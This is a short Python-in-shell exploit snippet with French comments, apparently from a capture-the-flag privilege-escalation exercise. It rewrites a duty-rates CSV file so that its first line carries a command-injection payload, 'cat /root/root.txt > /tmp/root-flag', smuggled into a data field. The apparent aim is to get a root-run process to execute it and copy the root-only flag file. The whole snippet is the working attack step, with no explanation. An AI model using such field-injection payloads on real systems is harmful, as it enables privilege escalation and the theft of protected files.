python3 - <<'PY'
from pathlib import Path

p = Path("/opt/vrs/data/duty-rates.csv")
lines = p.read_text().splitlines()

# Retirer les précédents payloads
lines = [
    line for line in lines
    if not line.startswith("SPIRITS=45;")
]

payload = "SPIRITS=45;cat /root/root.txt > /tmp/root-flag; #,45,20"

p.write_text(payload + "\n" + "\n".join(lines) + "\n")
print("[+] Payload envoyé")
PY